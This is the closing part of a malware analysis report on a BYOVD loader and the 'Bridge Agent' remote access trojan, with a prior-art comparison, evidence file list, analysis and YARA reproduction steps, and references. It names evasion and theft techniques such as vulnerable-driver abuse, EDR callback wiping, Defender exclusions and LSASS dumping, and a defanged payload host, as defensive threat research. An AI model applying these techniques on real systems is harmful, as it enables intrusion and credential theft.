strings   bridge-agent-v5.1.4-chromium-unified, !!! BRIDGE AGENT PANIC !!!, bridge-ca-recovery-2026-08, IT_solutions.pdb, collector.pdb
```

## Prior art and what is new here

All findings above come from our own reading of the code and are cited by
address. Ontinue's report covers the same loader family under another name.

| Source | Covers | This report |
|---|---|---|
| Ontinue, Rhys Downing, "Lunex unmasked: a new information stealer deployed through BYOVD" (2026-09-24) | the LunexLoader / Lunex stealer chain: MSI delivery via a fake CAPTCHA, the loader's PDFWKRNL.sys BYOVD with an AES-256-GCM encrypted driver, PDB download with a symsrv User-Agent, notify-routine removal for a 20-driver list, PEB masquerade, SeLoadDriverPrivilege, COM elevation; payload `psychedeliclove.exe` from 107.175.82[.]242:9000 | confirms the BYOVD core on a later build. Ontinue describes the encrypted driver as an overlay; in this build it is in .rdata and the overlay is filler. Adds: exact IOCTL buffer layout checked in the driver, object-callback and registry-callback wiping (whole list), MsMpEng PPL strip and token swap, Defender WMI exclusions, the command-line options, the `0xd1d2` container, and a different payload |
| MalwareBazaar, Triage, ANY.RUN | hashes, tags, the "dropped by" link from loader to agent | the tags "stealer" and "rust" on the loader are explained by the payload; the loader itself is neither |
| none found | the Bridge Agent RAT: C2 protocol, Ed25519 auth, job set, Backstage browser takeover, surveillance collectors, persistence; the companion collector with ChromElevator and the LSASS dumper | new |

## Evidence files

Loader: `evidence/stub_decomp.c` (Ghidra), `evidence/decrypted_strings.tsv`,
`triage.md`. Agent and collector: `reports/bridgeagent/2026-10-16-c4545d48db19/`
(`triage.md`, `collector_triage.md`, `evidence/key_disasm.txt`,
`config_extract.txt`, `strings_app.txt`, `crates.txt`, `imports.txt`,
`collector_strings.txt`, `collector_disasm.txt`, `yara_validation.txt`).
Samples stay in `samples/<sha256>/` with decoded stages as `stageN_<sha16>.bin`,
mode 0400. None were executed and none are published.

## Reproducing

| Step | Tool |
|---|---|
| Loader decompile | `analyzeHeadless ... -postScript ExportDecomp.java <out.c>` |
| Loader strings | `python3 -I tools/bridgeagent_strings.py sample.bin evidence/stub_decomp.c` |
| Driver decrypt | `python3 -I tools/bridgeagent_driver.py sample.bin <out_dir>` (AES-256-GCM, tag verified) |
| Container split | `python3 -I tools/bridgeagent_container.py <container>` |
| Agent default C2 | `python3 -I tools/bridgeagent_backdoor_config.py <agent>` |
| YARA | `yr scan -r detections/yara/bridgeagent_loader.yar <dir>`, same for `bridgeagent_backdoor.yar` |

## References

- Ontinue, Lunex Unmasked: A New Information Stealer Deployed Through BYOVD: https://www.ontinue.com/resource/lunex-unmasked-a-new-information-stealer-deployed-through-byovd/
- CVE-2023-20598, AMD PDFWKRNL.sys improper access control: https://nvd.nist.gov/vuln/detail/CVE-2023-20598
- LOLDrivers, PDFWKRNL.sys: https://www.loldrivers.io/
- ChromElevator (public Chrome App-Bound Encryption tool): https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
- MalwareBazaar entries for the loader, agent and container; ThreatFox entry for 107.175.82[.]242
